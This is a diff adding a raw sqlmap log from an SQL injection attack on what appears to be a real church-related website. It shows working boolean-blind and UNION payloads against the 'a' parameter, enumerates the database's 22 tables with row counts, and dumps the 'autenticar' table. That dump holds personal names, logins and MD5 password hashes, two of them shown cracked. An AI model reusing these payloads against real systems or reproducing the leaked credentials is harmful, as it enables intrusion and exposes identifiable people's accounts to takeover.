@@ -1,0 +1,118 @@
+sqlmap identified the following injection point(s) with a total of 91 HTTP(s) requests:
+---
+Parameter: a (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: a=289 AND 4186=4186
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: a=-9206 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71786b7871,0x54585744424371736b674351726f53696c634a62716c4c76656248544a745574424348544c575670,0x7171627071),NULL,NULL-- lBMf
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+available databases [2]:
+[*] ecosdaliberdade1
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: a (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: a=289 AND 4186=4186
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: a=-9206 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71786b7871,0x54585744424371736b674351726f53696c634a62716c4c76656248544a745574424348544c575670,0x7171627071),NULL,NULL-- lBMf
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL 5
+Database: ecosdaliberdade1
+[22 tables]
++-----------------------------+
+| acessos                     |
+| album_fotos                 |
+| autenticar                  |
+| avaliacaoAovivo             |
+| banners                     |
+| cadastros                   |
+| contato                     |
+| conteudos                   |
+| equipesdelouvor             |
+| fotos                       |
+| informativos                |
+| informativos_comentarios    |
+| inscricao                   |
+| inscricaoRetiroCarnaval2012 |
+| livrinhos                   |
+| noticias                    |
+| playerAovivo                |
+| programacao                 |
+| programasderadio            |
+| tweet                       |
+| videos                      |
+| videos_comentarios          |
++-----------------------------+
+
+Database: ecosdaliberdade1
++-----------------------------+---------+
+| Table                       | Entries |
++-----------------------------+---------+
+| programacao                 | 1435    |
+| fotos                       | 932     |
+| videos                      | 791     |
+| contato                     | 780     |
+| cadastros                   | 603     |
+| avaliacaoAovivo             | 390     |
+| album_fotos                 | 278     |
+| informativos                | 247     |
+| inscricaoRetiroCarnaval2012 | 125     |
+| livrinhos                   | 97      |
+| inscricao                   | 69      |
+| conteudos                   | 42      |
+| videos_comentarios          | 13      |
+| acessos                     | 11      |
+| banners                     | 11      |
+| informativos_comentarios    | 11      |
+| programasderadio            | 11      |
+| autenticar                  | 6       |
+| playerAovivo                | 6       |
+| noticias                    | 4       |
+| equipesdelouvor             | 2       |
+| tweet                       | 1       |
++-----------------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: a (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: a=289 AND 4186=4186
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: a=-9206 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71786b7871,0x54585744424371736b674351726f53696c634a62716c4c76656248544a745574424348544c575670,0x7171627071),NULL,NULL-- lBMf
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL 5
+Database: ecosdaliberdade1
+Table: autenticar
+[6 entries]
++----+------------+----------+-------------------------------------------+---------------+---------+
+| id | nome       | data     | senha                                     | login         | status  |
++----+------------+----------+-------------------------------------------+---------------+---------+
+| 7  | Maiko      | 10/08/08 | 202cb962ac59075b964b07152d234b70 (123)    | maiko         | Ativado |
+| 12 | Isaí Hort  | 13/04/09 | b1ba89554b0e3b58469b5e137f8c3838          | isai          | Ativado |
+| 13 | Cristian   | 22/08/09 | 5fd2ddd3130a43d54d74db9bf3b24528          | cristiandiehl | Ativado |
+| 14 | Douglas    | 19/07/10 | 9fe352d7912a5310f2510bc441405b94 (124563) | Douglas       | Ativado |
+| 15 | Mário Hort | 10/10/12 | 1c99ba97f5a4fba08015c0d968e29f23          | mariohort     | Ativado |
+| 16 | Video      | 22/11/16 | b1ba89554b0e3b58469b5e137f8c3838          | video         | Ativado |
++----+------------+----------+-------------------------------------------+---------------+---------+
+
